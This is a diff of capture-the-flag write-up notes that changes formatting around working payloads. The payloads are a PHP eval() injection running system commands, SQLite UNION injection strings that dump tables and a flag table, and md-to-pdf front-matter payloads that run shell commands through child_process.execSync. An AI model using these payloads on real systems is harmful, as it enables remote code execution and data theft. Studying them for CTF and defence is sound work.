@@ -36,7 +36,7 @@ for i in range(50):
 
 
 ## LoveTok `Code Injection [PHP eval()]`
-```
+```url
 # Get flag file name
 http://<ip_address>/?format=${system($_GET[1])}&1=ls
 
@@ -86,13 +86,13 @@ JWT Algorithm Confusion -> https://portswigger.net/web-security/jwt/algorithm-co
 
 Next SQL Injection (SQLite3)
 ```sql
-# Get Tables
+-- Get Tables
 user_in_database' union select name,NULL from sqlite_master where type='table' and name not like 'sqlite_%';-- 
 
-# Get Columns
+-- Get Columns
 user_in_database' union select sql,NULL from sqlite_master where tbl_name = 'users' and type = 'table';--
 
-# Get Flag
+-- Get Flag
 user_in_database' and 1=2 UNION SELECT *,NULL from flag_storage;--
 ```
 
@@ -104,11 +104,11 @@ Payload:
 const { mdToPdf } = require('md-to-pdf'); var payload = '---js\n((require("child_process")).execSync("id > /tmp/RCE.txt"))\n---RCE';
 ```
 Payload for this challenge:
-```
-# In request:
+```js
+// In request:
 "---js\n((require(\"child_process\")).execSync(\"cd .. && cat flag.txt > /app/static/instances/RCE.txt\"))\n---RCE;"
 
-# In PDF editor on site:
+// PDF editor on site:
 ---js
   ((require(\"child_process\")).execSync(\"cd .. && cat flag.txt > /app/static/instances/RCE.txt\"))
 ---RCE;
